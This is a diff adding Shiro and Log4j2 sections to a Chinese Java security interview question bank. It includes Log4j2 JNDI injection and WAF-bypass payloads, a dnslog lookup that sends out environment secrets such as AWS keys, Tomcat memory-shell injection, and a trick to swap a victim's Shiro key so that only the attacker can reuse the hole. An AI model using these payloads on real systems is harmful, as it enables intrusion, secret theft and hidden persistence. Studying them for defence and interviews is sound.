@@ -6,9 +6,11 @@
 
 为什么要做：**帮助自己校招找到工作，同时帮助广大Java安全师傅顺利找到工作**
 
+项目目标：完全掌握本项目后进轻松大厂
+
 计划定期更新，从基础到各种实战问题，打造齐全的Java安全面试题库
 
-最低难度★，最高难度★★★★★
+最低难度★   最高难度★★★★★
 
 
 
@@ -211,6 +213,120 @@ LinkedHashSet.readObject()
 - 了解缩小反序列化Payload的手段吗（★★★）
 
 首先最容易的方案是使用Javassist生成字节码，这种情况下生成的字节码较小。进一步可以用ASM删除所有的LineNumber指令，可以更小一步。最终手段可以分块发送多个Payload最后合并再用URLClassLoader加载
+
+
+
+- 待师傅们补充
+
+
+
+## Shiro
+
+- Shiro反序列化怎么检测key（★★★）
+
+实例化一个`SimplePrincipalCollection`遍历key列表进行AES加密，然后加入到`Cookie`的`rememberMe`字段中发送，如果响应头的`Set-Cookie`字段包含`rememberMe=deleteMe`说明不是该密钥，如果什么都不返回，说明当前key是正确的key。实际中可能需要多次这样的请求来确认key
+
+
+
+- Shiro 721怎么利用（★★）
+
+需要用到Padding Oracle Attack技术，限制条件是需要已知合法用户的`rememberMe`且需要爆破较长的时间
+
+
+
+- 最新版Shiro还存在反序列化漏洞吗（★）
+
+存在，如果密钥是常见的，还是有反序列化漏洞的可能性
+
+
+
+- Shiro反序列化Gadget选择有什么坑吗（★★★）
+
+默认不包含CC链包含CB1链。用不同版本的CB1会导致出错，因为`serialVersionUID` 不一致
+
+另一个CB1的坑是`Comparator`来自于CC，需要使用如下的
+
+```java
+BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+```
+
+
+
+- Shiro注Tomcat内存马有什么坑吗（★★★★）
+
+Shiro注内存马时候由于反序列化Payload过大会导致请求头过大报错
+
+解决办法有两种：第一种是反射修改Tomcat配置里的请求头限制熟悉，但这个不靠谱，不同版本`Tomcat`可能修改方式不一致。另外一种更为通用的手段是打过去一个`Loader`的`Payload`加载请求`Body`里的字节码，将内存马字节码写入请求`Body`中。这种方式的缺点是依赖当前请求对象，更进一步可以写文件`URLClassLoader`加载
+
+
+
+- 有什么办法让Shiro洞只能被你一人发现（★★）
+
+发现Shiro洞后，改了其中的key为非通用key。通过已经存在的反序列化可以执行代码，反射改了`RememberMeManager`中的key即可。但这样会导致已登录用户失效，新用户不影响
+
+
+
+- Shiro的权限绕过问题了解吗（★★）
+
+主要是和Spring配合时候的问题，例如`/;/test/admin/page`问题，在`Tomcat`判断`/;test/admin/page` 为test应用下的`/admin/page`路由，进入到Shiro时被`;`截断被认作为`/`,再进入Spring时又被正确处理为test应用下的`/admin/page`路由，最后导致shiro的权限绕过。后一个修复绕过，是针对动态路由如`/admin/{name}`
+
+
+
+## Log4j2
+
+- 谈谈Log4j2漏洞（★★）
+
+漏洞原理其实不难，简单来说就是对于`${jndi:}`格式的日志默认执行`JndiLoop.loojup`导致的RCE。有几处关键问题，首先日志的任何一部分插入`${}`都会进行递归处理，也就是说`log.info/error/warn`等方法如果日志内容可控，就会导致这个问题。这个漏洞本身不复杂，后续的一个绕过比较有趣
+
+
+
+- 知道Log4j2 2.15.0 RC1修复的绕过吗（★★★）
+
+修复内容限制了协议和HOST以及类型，其中类型这个东西其实没用，协议的限制中包含了`LDAP`等于没限制。重点在于HOST的限制，只允许本地localhost和127.0.0.1等IP。但这里出现的问题是，加入了限制但没有捕获异常，如果产生异常会继续`lookup`所以如果在URL中加入一些特殊字符，例如空格，即可导致异常然后RCE
+
+
+
+- Log4j2的两个DOS CVE了解吗（★★）
+
+其中一个DOS是`lookup`本身延迟等待和允许多个标签`${}`导致的问题
+
+另一个DOS是嵌套标签`${}`导致栈溢出
+
+
+
+- Log4j2 2.15.0正式版的绕过了解吗（★★★）
+
+正式版的修复只是在之前基础上捕获了异常。这个绕过本质还是绕HOST限制。使用`127.0.0.1#evil.com`即可绕过，需要服务端配置泛域名，所以#前的127.0.0.1会被认为是某个子域名，而本地解析认为这是127.0.0.1绕过了HOST的限制。但该RCE仅可以在MAC OS和部分Linux平台成功
+
+
+
+- Log4j2绕WAF的手段有哪些（★★）
+
+使用类似`${::-J}`的方式做字符串的绕过，还可以结合`upper`和`lower`标签进行嵌套
+
+有一些特殊字符的情况结合大小写转换有巧妙的效果，还可以加入垃圾字符
+
+例如：`${jnd${upper:ı}:ldap://127.0.0.1:1389/Calc}`
+
+
+
+- Log4j2除了RCE还有什么利用姿势（★★★）
+
+利用其他的`lookup`可以做信息泄露例如`${env:USER}`和`${env:AWS_SECRET_ACCESS_KEY}`
+
+在`SpringBoot`情况下可以使用`bundle:application`获得数据库密码等敏感信息
+
+这些敏感信息可以利用`dnslog`外带`${jndi:ldap://${java:version}.xxx.dnslog.cn}`
+
+
+
+
+
+
+
+
+
+
 
 
 
